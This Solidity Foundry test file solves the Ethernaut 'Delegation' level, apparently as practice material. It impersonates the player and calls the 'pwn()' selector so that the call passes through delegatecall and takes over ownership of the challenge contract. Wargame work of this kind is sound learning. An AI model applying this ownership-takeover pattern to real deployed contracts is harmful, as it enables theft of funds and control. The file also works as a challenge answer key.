// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {Delegation, DelegationFactory} from "ethernaut/levels/DelegationFactory.sol";

contract DelegationLevel is SetUpLevelTest {
    Delegation internal delegation;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0 ether;
        playerBalance = 0 ether;
        level = address(new DelegationFactory());
        super.setUp();
        delegation = Delegation(instance);

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        // Regardless of vm.prank, for test contract address(this):
        //   tx.origin == FOUNDRY_TX_ORIGIN(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38)
        //   msg.sender == FOUNDRY_SENDER(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38)
        emit log_named_address("tx.origin", tx.origin);
        emit log_named_address("msg.sender", msg.sender);
        emit log_named_address("player", player);
        emit log_named_address("address(this)", address(this));
        (bool success, ) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
        assert(success);
        // For target contract address(delegation):
        //   tx.origin == FOUNDRY_TX_ORIGIN(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38)
        //   msg.sender == player
        vm.stopPrank();
    }
}
